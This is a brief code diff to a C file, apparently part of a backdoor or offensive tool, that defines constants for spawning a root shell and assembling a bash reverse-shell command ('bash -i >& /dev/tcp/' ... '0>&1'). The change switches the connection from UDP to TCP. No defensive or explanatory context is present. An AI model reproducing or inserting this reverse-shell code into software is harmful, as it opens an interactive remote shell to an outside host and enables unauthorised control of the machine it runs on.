@@ -2,7 +2,7 @@
 #define HOME "HOME=/root"
 #define TERM "TERM=xterm-256color"
 #define SHELL "/bin/bash"
-#define EXEC_P1 "bash -i >& /dev/udp/"
+#define EXEC_P1 "bash -i >& /dev/tcp/"
 #define EXEC_P2 "0>&1"
 
 struct shell_params {
